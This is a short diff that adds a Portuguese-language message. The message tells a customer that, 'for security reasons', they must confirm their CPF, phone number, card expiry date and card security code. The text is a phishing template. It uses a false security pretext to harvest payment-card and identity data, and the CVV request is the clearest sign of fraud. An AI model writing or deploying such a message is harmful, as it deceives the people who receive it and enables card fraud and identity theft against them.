@@ -1,0 +1,5 @@
+Olá cliente, por motivos de segurança, você precisa confirmar os seguintes dados abaixo.
+CPF:
+Telefone:
+Validade do Cartão:
+Código de segurança:
